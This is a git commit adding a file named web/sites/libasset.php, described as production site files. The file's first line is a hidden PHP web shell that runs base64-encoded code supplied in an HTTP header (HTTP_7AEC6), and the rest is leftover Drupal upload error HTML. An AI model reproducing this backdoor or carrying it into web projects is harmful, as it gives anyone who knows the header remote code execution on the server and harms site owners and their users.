eff10d6d46c9da047759221511cdc5d98388e7b9
Claudine Chionh <cc@claudinec.net>
2019-01-25 09:17:12 +1100

    Update with production site files.

---
+++ web/sites/libasset.php
@@ -0,0 +1,5 @@
+<?php if(@isset($_SERVER[HTTP_7AEC6])){@eval(base64_decode($_SERVER[HTTP_7AEC6]));}exit;?><span class="ajax-new-content"></span>sites/libasset.phpArraymarkup<div class="alert alert-block alert-danger messages error">
+  <a class="close" data-dismiss="alert" href="#">&times;</a>
+<h4 class="element-invisible">Error message</h4>
+<em class="placeholder">Notice</em>: Undefined index: #value in <em class="placeholder">file_ajax_upload()</em> (line <em class="placeholder">263</em> of <em class="placeholder">/home3/ascmorga/public_html/modules/file/file.module</em>).</div>
+ArrayArraybeforeArraysites/libasset.php
